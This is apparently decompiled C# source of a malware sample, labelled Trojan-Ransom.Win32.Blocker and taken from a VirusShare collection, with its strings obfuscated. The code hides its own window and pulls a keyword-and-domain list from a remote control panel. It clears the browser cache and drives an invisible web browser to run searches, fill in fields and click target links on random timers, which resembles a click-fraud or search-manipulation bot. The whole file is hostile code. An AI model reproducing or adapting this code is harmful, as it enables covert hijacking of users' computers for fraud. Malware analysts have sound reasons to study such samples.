// Decompiled with JetBrains decompiler
// Type: hiexplorer.Form1
// Assembly: Intel(R) GFX, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CC091627-EE5B-4936-A09E-8A0DFCC67467
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.ianl-aa5167e6e06a959ea93b440dce1e8d49463422ca45b543de0cfc4944c63e3419.exe

using SmartAssembly.StringsEncoding;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace hiexplorer
{
  public class Form1 : Form
  {
    private const int GWL_EXSTYLE = -20;
    private const int WS_EX_TOOLWINDOW = 128;
    private const int INTERNET_OPTION_END_BROWSER_SESSION = 42;
    private string ana = Strings.Get(224);
    private string baba = Strings.Get(265);
    private System.Collections.Generic.Queue<KeyValuePair<string, string>> kelimelistesi = new System.Collections.Generic.Queue<KeyValuePair<string, string>>();
    private string kelime;
    private string domain;
    private int suankisayfa = 1;
    private Dictionary<string, bool> gezilenler = new Dictionary<string, bool>();
    private Random rnd = new Random();
    private IContainer components = (IContainer) null;
    private WebBrowser webBrowser1;

    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr window, int index, int value);

    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr window, int index);

    [DllImport("winmm.dll")]
    public static extern int sndPlaySound(string lpszSoundName, int uFlags);

    [DllImport("wininet.dll", SetLastError = true)]
    private static extern bool InternetSetOption(
      IntPtr hInternet,
      int dwOption,
      IntPtr lpBuffer,
      int lpdwBufferLength);

    public Form1() => this.InitializeComponent();

    private void webBrowser1_NewWindow(object sender, CancelEventArgs e) => \u0012.\u007E\u0080((object) e, true);

    private void Basla()
    {
      this.DeleteCache();
      try
      {
        this.suankisayfa = 1;
        KeyValuePair<string, string> keyValuePair = this.kelimelistesi.Dequeue();
        this.kelime = keyValuePair.Key;
        this.domain = keyValuePair.Value;
        while (\u0013.\u007E\u0089((object) this.webBrowser1))
          \u000E.\u0017(10000);
        \u0014.\u007E\u008B((object) this.webBrowser1, Strings.Get(302));
      }
      catch (InvalidOperationException ex)
      {
        \u000E.\u0016(-1);
      }
    }

    private void KelimeleriCek()
    {
      WebClient webClient = new WebClient();
      try
      {
        string str1 = Strings.Get(359);
        try
        {
          str1 = \u0015.\u007E\u0090((object) webClient, this.baba);
        }
        catch (Exception ex)
        {
          \u000E.\u0016(-1);
        }
        \u0016 obj = \u0016.\u007E\u0092;
        string str2 = str1;
        char[] chArray = new char[1]{ '\n' };
        foreach (string str3 in obj((object) str2, chArray))
        {
          string[] strArray = \u0016.\u007E\u0092((object) \u0017.\u007E\u0093((object) str3), new char[1]
          {
            '|'
          });
          try
          {
            string key = strArray[1];
            KeyValuePair<string, string> keyValuePair = new KeyValuePair<string, string>(strArray[0], key);
            this.gezilenler.Add(key, false);
            this.kelimelistesi.Enqueue(keyValuePair);
          }
          catch
          {
          }
        }
      }
      finally
      {
        if (webClient != null)
          \u0008.\u007E\u000E((object) webClient);
      }
    }

    private void ButonTikla(string attribute, string value)
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(360));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0013.\u007E\u008A((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u0011.\u007E\u001D((object) \u0015.\u007E\u0091((object) htmlElement, attribute), value))
          {
            \u0014.\u007E\u008C((object) htmlElement, Strings.Get(369));
            \u0014.\u007E\u008C((object) htmlElement, Strings.Get(386));
            object obj = \u001D.\u007E\u009D((object) htmlElement, Strings.Get(403));
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0008.\u007E\u000E((object) disposable);
      }
    }

    private void itButonTikla()
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(360));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0013.\u007E\u008A((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u0011.\u007E\u001D((object) \u0015.\u007E\u0091((object) htmlElement, Strings.Get(412)), Strings.Get(421)))
          {
            object obj = \u001D.\u007E\u009D((object) htmlElement, Strings.Get(403));
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0008.\u007E\u000E((object) disposable);
      }
    }

    private void webBrowser1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
      string str = \u0017.\u007E\u0094((object) \u001E.\u007E\u009E((object) e));
      if (\u001F.\u009F(str, Strings.Get(302)))
      {
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          this.TextBoxYaz(Strings.Get(1028), Strings.Get(1037), Strings.Get(1042));
          this.TextBoxYaz(Strings.Get(1028), Strings.Get(1047), this.kelime);
        }), 3000, 5000);
        this.SureliIslet((Form1.SureliFonksiyon) (() => this.ButonTikla(Strings.Get(412), Strings.Get(421))), 7000, 11000);
      }
      else if (\u0011.\u007E\u001E((object) str, Strings.Get(434)) && !\u0011.\u007E\u001D((object) str, Strings.Get(487)))
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          if (this.LinkeTikla(this.domain))
            return;
          this.SureliIslet(new Form1.SureliFonksiyon(this.Ilerle), 5000, 12000);
        }), 3000, 6000);
      else if (\u0011.\u007E\u001E((object) str, Strings.Get(496)) && \u0011.\u007E\u001D((object) str, Strings.Get(487)))
      {
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          if (this.LinkeTikla(this.domain))
            return;
          this.SureliIslet(new Form1.SureliFonksiyon(this.Ilerle), 5000, 12000);
        }), 3000, 6000);
      }
      else
      {
        if (!\u0011.\u007E\u001D((object) str, this.domain) || \u0011.\u007E\u001E((object) str, Strings.Get(496)))
          return;
        this.SureliIslet((Form1.SureliFonksiyon) (() =>
        {
          if (this.gezilenler[this.domain])
            return;
          this.RastGeleGez();
        }), 20000, 50000);
      }
    }

    private void Ilerle()
    {
      ++this.suankisayfa;
      HtmlElementCollection elementCollection = \u007F.\u007E\u0002\u0002((object) \u0018.\u007E\u0098((object) this.webBrowser1));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0013.\u007E\u008A((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u001F.\u009F(\u0017.\u007E\u0095((object) htmlElement), this.suankisayfa.ToString()) || \u001F.\u009F(\u0017.\u007E\u0095((object) htmlElement), \u0010.\u001C(this.suankisayfa.ToString(), Strings.Get(525))))
          {
            \u0014.\u007E\u008C((object) htmlElement, Strings.Get(369));
            \u0014.\u007E\u008C((object) htmlElement, Strings.Get(386));
            object obj = \u001D.\u007E\u009D((object) htmlElement, Strings.Get(403));
          }
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0008.\u007E\u000E((object) disposable);
      }
    }

    private void RastGeleGez()
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(530));
      List<HtmlElement> htmlElementList = new List<HtmlElement>(\u0080.\u007E\u0003\u0002((object) elementCollection));
      if (\u0080.\u007E\u0003\u0002((object) elementCollection) > 0)
      {
        IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
        try
        {
          while (\u0013.\u007E\u008A((object) enumerator))
          {
            HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
            if (\u001F.\u0001\u0002(\u0015.\u007E\u0091((object) htmlElement, Strings.Get(535)), Strings.Get(544)) && !\u0081.\u0005\u0002(\u0017.\u007E\u0096((object) htmlElement)) && this.NormalLink(\u0015.\u007E\u0091((object) htmlElement, Strings.Get(553))))
              htmlElementList.Add(htmlElement);
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            \u0008.\u007E\u000E((object) disposable);
        }
        if (htmlElementList.Count > 0)
        {
          \u0014.\u007E\u008C((object) htmlElementList[\u0082.\u007E\u0007\u0002((object) this.rnd, htmlElementList.Count - 1)], Strings.Get(369));
          \u0014.\u007E\u008C((object) htmlElementList[\u0082.\u007E\u0007\u0002((object) this.rnd, htmlElementList.Count - 1)], Strings.Get(386));
          object obj = \u001D.\u007E\u009D((object) htmlElementList[\u0082.\u007E\u0007\u0002((object) this.rnd, htmlElementList.Count - 1)], Strings.Get(403));
          htmlElementList.Clear();
        }
      }
      this.SureliIslet((Form1.SureliFonksiyon) (() => this.SureliIslet(new Form1.SureliFonksiyon(this.Basla), 240001, 241000)), 5000, 6000);
    }

    private bool NormalLink(string url) => !\u0011.\u007E\u001F((object) url, Strings.Get(562)) && !\u0011.\u007E\u001F((object) url, Strings.Get(567)) && !\u0011.\u007E\u001F((object) url, Strings.Get(572)) && !\u0011.\u007E\u001F((object) url, Strings.Get(589)) && !\u0011.\u007E\u001F((object) url, Strings.Get(606)) && !\u0011.\u007E\u001F((object) url, Strings.Get(615)) && !\u0011.\u007E\u001F((object) url, Strings.Get(624)) && !\u0011.\u007E\u001F((object) url, Strings.Get(633)) && !\u0011.\u007E\u001F((object) url, Strings.Get(642)) && !\u0011.\u007E\u001F((object) url, Strings.Get(651)) && !\u0011.\u007E\u001F((object) url, Strings.Get(660)) && !\u0011.\u007E\u001F((object) url, Strings.Get(669)) && !\u0011.\u007E\u001F((object) url, Strings.Get(678)) && !\u0011.\u007E\u001F((object) url, Strings.Get(687));

    private void DeleteCache()
    {
      ProcessStartInfo processStartInfo1 = new ProcessStartInfo();
      \u0014.\u007E\u008D((object) processStartInfo1, Strings.Get(696));
      \u0014.\u007E\u008E((object) processStartInfo1, Strings.Get(713));
      Process process1 = \u0083.\u0008\u0002(processStartInfo1);
      \u0008.\u007E\u000F((object) process1);
      ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
      \u0014.\u007E\u008D((object) processStartInfo2, Strings.Get(696));
      \u0014.\u007E\u008E((object) processStartInfo2, Strings.Get(762));
      Process process2 = \u0083.\u0008\u0002(processStartInfo2);
      \u0008.\u007E\u000F((object) process2);
      Form1.InternetSetOption(IntPtr.Zero, 42, IntPtr.Zero, 0);
    }

    private void TextBoxYaz(string att, string attname, string attvalue)
    {
      if (!\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
        return;
      HtmlElementCollection elementCollection = \u001A.\u007E\u009A((object) \u0018.\u007E\u0098((object) this.webBrowser1), Strings.Get(360));
      IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
      try
      {
        while (\u0013.\u007E\u008A((object) enumerator))
        {
          HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
          if (\u0011.\u007E\u007F((object) \u0015.\u007E\u0091((object) htmlElement, att), attname))
            \u0084.\u007E\u000E\u0002((object) htmlElement, Strings.Get(412), attvalue);
        }
      }
      finally
      {
        if (enumerator is IDisposable disposable)
          \u0008.\u007E\u000E((object) disposable);
      }
    }

    private bool LinkeTikla(string url)
    {
      bool flag = false;
      List<string> stringList = new List<string>();
      if (\u0019.\u0099(\u0018.\u007E\u0098((object) this.webBrowser1), (HtmlDocument) null))
      {
        HtmlElementCollection elementCollection = \u007F.\u007E\u0002\u0002((object) \u0018.\u007E\u0098((object) this.webBrowser1));
        IEnumerator enumerator = \u001B.\u007E\u009B((object) elementCollection);
        try
        {
          while (\u0013.\u007E\u008A((object) enumerator))
          {
            HtmlElement htmlElement = (HtmlElement) \u001C.\u007E\u009C((object) enumerator);
            string str = \u0015.\u007E\u0091((object) htmlElement, Strings.Get(553));
            stringList.Add(str);
            if (!\u0011.\u007E\u001D((object) str, Strings.Get(811)) && !\u0011.\u007E\u001D((object) str, Strings.Get(856)) && \u0011.\u007E\u001D((object) \u0015.\u007E\u0091((object) htmlElement, Strings.Get(553)), url))
            {
              \u0014.\u007E\u008C((object) htmlElement, Strings.Get(369));
              \u0014.\u007E\u008C((object) htmlElement, Strings.Get(386));
              object obj = \u001D.\u007E\u009D((object) htmlElement, Strings.Get(877));
              flag = true;
              break;
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            \u0008.\u007E\u000E((object) disposable);
        }
      }
      return flag;
    }

    private void SureliIslet(Form1.SureliFonksiyon x, int min, int max)
    {
      System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
      \u0087.\u007E\u0011\u0002((object) timer1, \u0086.\u007E\u0010\u0002((object) this.rnd, min, max));
      System.Windows.Forms.Timer timer2 = timer1;
      \u0088.\u007E\u0013\u0002((object) timer2, (EventHandler) ((s, ev) =>
      {
        x();
        \u0008.\u007E\u0013((object) (System.Windows.Forms.Timer) s);
        \u0008.\u007E\u0014((object) (System.Windows.Forms.Timer) s);
      }));
      \u0008.\u007E\u0010((object) timer2);
    }

    private void PanelAyarla()
    {
      string str1 = Strings.Get(359);
      WebHeaderCollection headerCollection1 = new WebHeaderCollection();
      \u0084.\u007E\u000F\u0002((object) headerCollection1, Strings.Get(886), Strings.Get(903));
      WebHeaderCollection headerCollection2 = headerCollection1;
      WebClient webClient1 = new WebClient();
      \u008A.\u007E\u0017\u0002((object) webClient1, \u0089.\u0015\u0002());
      \u008B.\u007E\u0018\u0002((object) webClient1, headerCollection2);
      WebClient webClient2 = webClient1;
      try
      {
        string str2 = \u0015.\u007E\u0090((object) webClient2, this.ana);
        Regex regex = new Regex(Strings.Get(972), RegexOptions.IgnoreCase | RegexOptions.Compiled);
        Match match = \u008C.\u007E\u0019\u0002((object) regex, str2);
        str1 = \u0017.\u007E\u0094((object) \u008E.\u007E\u001B\u0002((object) \u008D.\u007E\u001A\u0002((object) match), 1));
      }
      catch (Exception ex)
      {
        \u000E.\u0016(-1);
      }
      finally
      {
        if (webClient2 != null)
          \u0008.\u007E\u000E((object) webClient2);
      }
      this.baba = \u008F.\u007E\u001C\u0002((object) this.baba, Strings.Get(985), str1);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      \u0090.\u001D\u0002((object) this, new Size(\u0086.\u007E\u0010\u0002((object) this.rnd, 1024, 1366), \u0086.\u007E\u0010\u0002((object) this.rnd, 768, 768)));
      int windowLong = Form1.GetWindowLong(\u0091.\u007F\u0002((object) this), -20);
      Form1.SetWindowLong(\u0091.\u007F\u0002((object) this), -20, windowLong | 128);
      this.ieKontrol();
      this.PanelAyarla();
      this.KelimeleriCek();
      Araclar.DisableClickSounds();
      this.Basla();
    }

    private void ieKontrol()
    {
      WebBrowser webBrowser = new WebBrowser();
      Version version = \u0092.\u007E\u0080\u0002((object) webBrowser);
      if (\u0080.\u007E\u0004\u0002((object) version) < 7)
        \u000E.\u0016(-1);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        \u0008.\u007E\u000E((object) this.components);
      \u0012.\u0081((object) this, disposing);
    }

    private void InitializeComponent()
    {
      this.webBrowser1 = new WebBrowser();
      \u0008.\u0011((object) this);
      \u0093.\u007E\u0081\u0002((object) this.webBrowser1, DockStyle.Fill);
      \u0012.\u007E\u0082((object) this.webBrowser1, false);
      \u0094.\u007E\u0082\u0002((object) this.webBrowser1, new Point(0, 0));
      \u0014.\u007E\u008F((object) this.webBrowser1, Strings.Get(1002));
      \u0012.\u007E\u0083((object) this.webBrowser1, true);
      \u0090.\u007E\u001E\u0002((object) this.webBrowser1, new Size(761, 488));
      \u0087.\u007E\u0012\u0002((object) this.webBrowser1, 0);
      \u0012.\u007E\u0084((object) this.webBrowser1, false);
      \u0095.\u007E\u0083\u0002((object) this.webBrowser1, new WebBrowserDocumentCompletedEventHandler(this.webBrowser1_DocumentCompleted));
      \u0096.\u007E\u0084\u0002((object) this.webBrowser1, new CancelEventHandler(this.webBrowser1_NewWindow));
      \u0097.\u0086\u0002((object) this, new SizeF(6f, 13f));
      \u0098.\u0087\u0002((object) this, AutoScaleMode.Font);
      \u0090.\u001F\u0002((object) this, new Size(761, 488));
      \u009A.\u007E\u0089\u0002((object) \u0099.\u0088\u0002((object) this), (Control) this.webBrowser1);
      \u0014.\u008F((object) this, Strings.Get(1019));
      \u009B.\u008A\u0002((object) this, 0.0);
      \u0012.\u0086((object) this, false);
      \u0012.\u0087((object) this, false);
      \u009C.\u008B\u0002((object) this, FormStartPosition.CenterScreen);
      \u0088.\u0014\u0002((object) this, new EventHandler(this.Form1_Load));
      \u0012.\u0088((object) this, false);
    }

    private delegate void SureliFonksiyon();
  }
}
